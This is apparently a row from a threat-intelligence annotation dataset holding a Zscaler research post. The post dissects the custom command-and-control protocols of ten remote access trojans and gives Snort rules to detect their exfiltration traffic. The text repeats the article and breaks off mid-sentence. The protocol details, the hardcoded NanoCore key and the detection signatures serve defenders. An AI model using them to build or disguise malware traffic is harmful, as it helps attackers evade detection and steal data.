C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0040,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor 